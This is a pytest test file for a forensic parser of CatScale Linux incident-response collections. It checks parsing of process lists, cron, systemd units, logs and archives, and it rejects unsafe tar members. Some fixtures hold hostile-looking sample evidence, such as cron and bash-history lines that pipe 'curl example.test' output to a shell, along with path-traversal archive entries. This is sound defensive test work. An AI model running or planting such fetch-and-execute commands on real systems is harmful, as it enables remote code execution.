import csv
import io
from pathlib import Path
import tarfile

import pytest

from fireblade.core.catscale import HEADERS, kind, parse, records, recognized
from fireblade.core.collection import Collection, ToolPack, identify, sha256
from fireblade.core.engine import Case
from fireblade.core.models import View
from fireblade.core.sessions import read_session


def rows(text,path):
    return list(records(enumerate(text.splitlines(),1),path,[]))


@pytest.mark.parametrize('suffix,text,expected',[
    ('processes-axwwSo.txt','USER PID PPID VSZ RSS TT STAT STIME TIME COMMAND\nroot 42 1 200 100 ? Ss 08:00 0:01 /usr/bin/python app.py --x 1',{'PID':'42','PPID':'1','Commande':'/usr/bin/python app.py --x 1'}),
    ('processes-auxww.txt','USER PID %CPU %MEM VSZ RSS TTY STAT START TIME COMMAND\nalice 45 0.1 0.2 200 100 ? S 08:00 0:01 bash -c ls',{'Utilisateur':'alice','PID':'45','Commande':'bash -c ls'}),
    ('processes-ef.txt','UID PID PPID C STIME TTY TIME CMD\nroot 42 1 0 08:00 ? 00:01 /bin/sh -c id',{'PID':'42','PPID':'1','Commande':'/bin/sh -c id'}),
    ('ss-anepo.txt','Netid State Recv-Q Send-Q Local Address:Port Peer Address:Port Process\ntcp ESTAB 0 0 [::1]:22 [::1]:5566 users:(("sshd",pid=42,fd=3))',{'PID':'42','Protocole':'tcp','Adresse locale':'::1','Port distant':'5566'}),
    ('ss-anepo.txt','State Recv-Q Send-Q Local Address:Port Peer Address:Port\nLISTEN 0 128 0.0.0.0:22 *:* users:(("sshd",pid=4,fd=3))',{'PID':'4','Port local':'22','État':'LISTEN'}),
    ('netstat-antup.txt','tcp6 0 0 :::22 :::* LISTEN 42/sshd',{'PID':'42','Protocole':'tcp6','Port local':'22'}),
    ('processhashes.txt','a'*40+'  /proc/42/exe',{'SHA1':'a'*40,'Chemin':'/proc/42/exe'}),
    ('pot-webshell-hashes.txt','b'*64+'  /var/www/a b.php',{'SHA256':'b'*64,'Chemin':'/var/www/a b.php'}),
    ('process-exe-links.txt','lrwxrwxrwx 1 root root 0 Nov 2 08:00 /proc/42/exe -> /bin/bash (deleted)',{'PID':'42','Cible':'/bin/bash (deleted)'}),
    ('systemctl_service_status.txt','● ssh.service loaded active running OpenBSD Secure Shell server',{'Service':'ssh.service','État':'active','Description':'OpenBSD Secure Shell server'}),
    ('systemctl_all.txt','ssh.service enabled enabled',{'Service':'ssh.service','État':'enabled'}),
    ('cron-tab-list.txt','alice\n*/5 * * * * curl http://example.test/a | sh\nENDOFUSERCRON',{'Utilisateur':'alice','Planification':'*/5 * * * *','Commande':'curl http://example.test/a | sh'}),
    ('cron-tab-list.txt','root\n@reboot /tmp/test --argument value',{'Planification':'@reboot','Commande':'/tmp/test --argument value'}),
    ('persistence-systemdlist.txt','[Service]\nExecStart=/tmp/odd --arg 1',{'Section':'Service','Clé':'ExecStart','Valeur':'/tmp/odd --arg 1'}),
    ('passwd','alice:x:1000:1000:Alice:/home/alice:/bin/bash',{'Utilisateur':'alice','UID':'1000','Dossier personnel':'/home/alice'}),
    ('bash_history','#1730534400\ncurl example.test | sh',{'Horodatage':'1730534400','Commande':'curl example.test | sh'}),
    ('full-timeline.csv','123,1,/tmp/a,b,2026-01-01,2026-01-02,2026-01-03,-,root,root,-rwxr-xr-x,42',{'Inode':'123','Chemin':'/tmp/a,b','Taille':'42'}),
])
def test_structured_formats_preserve_raw_text_and_fields(suffix,text,expected):
    result=rows(text,suffix)
    assert any(all(row.get(key)==value for key,value in expected.items()) for row in result)
    assert all(row['Texte brut'] in text for row in result)
    assert all(row['Ligne'].isdigit() for row in result)


def test_process_status_is_one_record_per_pid():
    result=rows('Name:\tsshd\nPid:\t42\nPPid:\t1\n\nName:\tbash\nPid:\t43\nPPid:\t42','process-details.txt')
    assert len(result)==2 and [row['PID'] for row in result]==['42','43']
    assert result[0]['Fin de ligne']=='4' and result[1]['PPID']=='42'


def test_syslog_and_audit_keep_timestamp_without_inventing_year():
    row=rows('Nov  2 10:00:00 server sshd[42]: Failed password for alice','Logs/auth.log')[0]
    assert row['Horodatage']=='Nov  2 10:00:00' and row['PID']=='42'
    row=rows('type=SYSCALL msg=audit(1730534400.123:4): pid=42 ppid=1 uid=1000 exe="/bin/bash"','Logs/audit/audit.log')[0]
    assert row['PID']=='42' and row['Chemin']=='/bin/bash'


def test_unknown_lines_and_invalid_utf8_are_visible(tmp_path):
    source=tmp_path/'unknown.txt';source.write_bytes(b'unmatched output\ninvalid \xff\n')
    output=tmp_path/'out';output.mkdir();result=parse(source,output)
    assert result['raw']==2 and result['warnings']
    with Path(result['outputs'][0]['csv']).open() as stream:loaded=list(csv.DictReader(stream))
    assert loaded[1]['Texte brut']==r'invalid \xff' and loaded[1]['Lecture']=='Brute'


def add_tar(archive,name,value=b'',kind=None):
    item=tarfile.TarInfo(name);item.size=len(value)
    if kind:item.type=kind;item.linkname='/tmp/outside'
    archive.addfile(item,io.BytesIO(value))


def corpus(root):
    root.mkdir()
    for family in ('Process_and_Network','Persistence','System_Info','Logs'):(root/family).mkdir()
    (root/'Process_and_Network'/'srv-20261102-1000-processes-ef.txt').write_text('UID PID PPID C STIME TTY TIME CMD\nroot 42 1 0 10:00 ? 00:01 /tmp/test --flag\n')
    (root/'Persistence'/'srv-20261102-1000-cron-tab-list.txt').write_text('root\n@reboot /tmp/start --flag\nENDOFUSERCRON\n')
    (root/'System_Info'/'srv-20261102-1000-release.txt').write_text('NAME="Test Linux"\n')
    (root/'Logs'/'auth.log').write_text('Nov  2 10:00:00 srv sshd[42]: Failed password\n')
    return root


@pytest.mark.parametrize('organization,count',[('files',4),('artifacts',4),('combined',1)])
def test_actual_collection_imports_groups_and_preserves_sources(tmp_path,organization,count):
    root=corpus(tmp_path/'evidence');before={p:sha256(p) for p in root.rglob('*') if p.is_file()}
    collection=Collection(root,tmp_path/'results',ToolPack(tmp_path/'no-engines'),organization=organization)
    report=collection.parse()
    assert report['status']=='complete' and all(e['status']=='complete' for e in report['files'])
    snapshots,active=read_session(collection.output/'collection.fireblade-session');assert len(snapshots)==count
    for snapshot in snapshots:
        case=Case(snapshot.path)
        try:
            assert case.count(snapshot.view)>0
            assert 'Texte brut' in case.headers and 'Fireblade_ArtifactSource' in case.headers
            if organization=='combined':assert snapshot.view.groups==[0]
        finally:case.close()
    assert all(sha256(p)==digest for p,digest in before.items())
    assert len(Collection.reopen(collection.output,collection.pack).report['documents'])==count


def test_recognition_is_specific_and_supports_old_and_new_archives(tmp_path):
    assert recognized(tmp_path/'catscale_srv-20261102-1000.tar.gz')
    assert recognized(tmp_path/'FSecure_srv-20261102-1000.tar.gz')
    assert not recognized(tmp_path/'Logs'/'random.txt')
    assert not recognized(tmp_path/'notes.txt')
    root=corpus(tmp_path/'evidence')
    assert identify(root/'Logs'/'auth.log')==['CatScale']
    assert identify(root/'Process_and_Network'/'srv-20261102-1000-processes-ef.txt')==['CatScale']


def test_nested_archives_stream_without_extracting_links_or_unsafe_paths(tmp_path):
    inner=io.BytesIO()
    with tarfile.open(fileobj=inner,mode='w:gz') as archive:
        add_tar(archive,'var/log/auth.log',b'Nov  2 10:00:00 srv sshd[42]: Failed password\n')
        add_tar(archive,'var/log/wtmp',b'\x00binary')
    source=tmp_path/'catscale_srv-20261102-1000.tar.gz'
    with tarfile.open(source,mode='w:gz') as archive:
        add_tar(archive,'catscale_out/Logs/srv-20261102-1000-var-log.tar.gz',inner.getvalue())
        add_tar(archive,'../escape',b'test')
        add_tar(archive,'/absolute',b'test')
        add_tar(archive,'C:/windows/bad',b'test')
        add_tar(archive,'catscale_out/link',kind=tarfile.SYMTYPE)
    output=tmp_path/'out';output.mkdir();result=parse(source,output)
    assert result['structured']==1 and result['warnings']
    assert len([x for x in result['members'] if x['status']=='skipped'])==4
    assert any(x['status']=='unsupported' for x in result['members'])
    assert result['outputs'][0]['family']=='Journaux et connexions'
    assert not (tmp_path/'escape').exists()
    with Path(result['outputs'][0]['csv']).open() as stream:row=next(csv.DictReader(stream))
    assert row['Hôte']=='srv' and row['PID']=='42' and '!/' in row['Source']


def test_archive_limits_and_broken_members_are_reported(tmp_path,monkeypatch):
    import fireblade.core.catscale as module
    monkeypatch.setattr(module,'MAX_MEMBER',8)
    source=tmp_path/'catscale_test.tar.gz'
    with tarfile.open(source,mode='w:gz') as archive:add_tar(archive,'catscale_out/Logs/big.txt',b'x'*9)
    output=tmp_path/'out';output.mkdir();result=parse(source,output)
    assert not result['outputs'] and result['members'][-1]['status']=='skipped'
    source=tmp_path/'broken.tar.gz';source.write_bytes(b'not an archive')
    assert parse(source,output)['members'][0]['status']=='error'


def test_cancellation_stops_parser_and_closes_outputs(tmp_path):
    from fireblade.core.errors import OperationCancelled,cancellation_scope
    import threading
    source=tmp_path/'input.txt';source.write_text('data\n');output=tmp_path/'out';output.mkdir()
    cancelled=threading.Event();cancelled.set()
    with cancellation_scope(cancelled),pytest.raises(OperationCancelled):parse(source,output)


def test_decompression_budget_counts_skipped_archive_content(tmp_path,monkeypatch):
    import fireblade.core.catscale as module
    monkeypatch.setattr(module,'MAX_EXPANDED',1024)
    source=tmp_path/'catscale_test.tar.gz'
    with tarfile.open(source,'w:gz') as archive:add_tar(archive,'catscale_out/Logs/log.txt',b'x'*40000)
    output=tmp_path/'out';output.mkdir()
    with pytest.raises(ValueError,match='décompressées'):parse(source,output)


def test_compressed_log_retains_compressed_source_reference(tmp_path):
    import gzip
    source=tmp_path/'Logs'/'auth.log.gz';source.parent.mkdir()
    with gzip.open(source,'wb') as stream:stream.write(b'Nov  2 10:00:00 srv sshd[42]: message\n')
    output=tmp_path/'out';output.mkdir();result=parse(source,output)
    with Path(result['outputs'][0]['csv']).open() as stream:row=next(csv.DictReader(stream))
    assert row['Source']==str(source)+'!/auth.log' and row['Hôte']=='srv' and row['PID']=='42'


def test_long_lines_and_malformed_proc_blocks_are_reported(tmp_path,monkeypatch):
    import fireblade.core.catscale as module
    monkeypatch.setattr(module,'MAX_LINE',64)
    source=tmp_path/'large.txt';source.write_text('a'*65)
    output=tmp_path/'out';output.mkdir();result=parse(source,output)
    assert result['members'][0]['status']=='error' and result['warnings']
    source=tmp_path/'process-details.txt';source.write_text('Name: test\n'+('Field: abcdef\n'*20))
    output=tmp_path/'out2';output.mkdir();result=parse(source,output)
    assert result['members'][0]['status']=='error'


def test_large_raw_cell_survives_compaction_and_database_import(tmp_path):
    root=tmp_path/'catscale_out';folder=root/'System_Info';folder.mkdir(parents=True)
    value='x'*200000
    source=folder/'node-20261102-1000-unknown.txt';source.write_text(value+'\n')
    collection=Collection(root,tmp_path/'work',ToolPack(tmp_path/'no-pack'))
    report=collection.parse();assert len(report['documents'])==1
    case=Case(report['documents'][0]['path'])
    try:assert case.page(View())[0][1+case.headers.index('Texte brut')]==value
    finally:case.close()


def test_extracted_multi_host_tree_retains_identity_for_unprefixed_user_files(tmp_path):
    from fireblade.core.catscale import identity
    assert identity(tmp_path/'extracted'/'node-a-20261102-1000'/'User_Files'/'alice'/'bash_history')==('node-a','20261102-1000')
    assert identity('catscale_node-a-20261102-1000.tar.gz!/catscale_out/User_Files/home/alice/.bash_history')==('node-a','20261102-1000')


def test_windows_source_paths_keep_exact_filename_dispatch():
    assert kind(r'C:\case\catscale_out\System_Info\etc-key-files\etc\passwd')=='passwd'
    row=rows('alice:x:1000:1000:Alice:/home/alice:/bin/bash',r'C:\case\catscale_out\System_Info\etc\passwd')[0]
    assert row['UID']=='1000' and row['Utilisateur']=='alice'
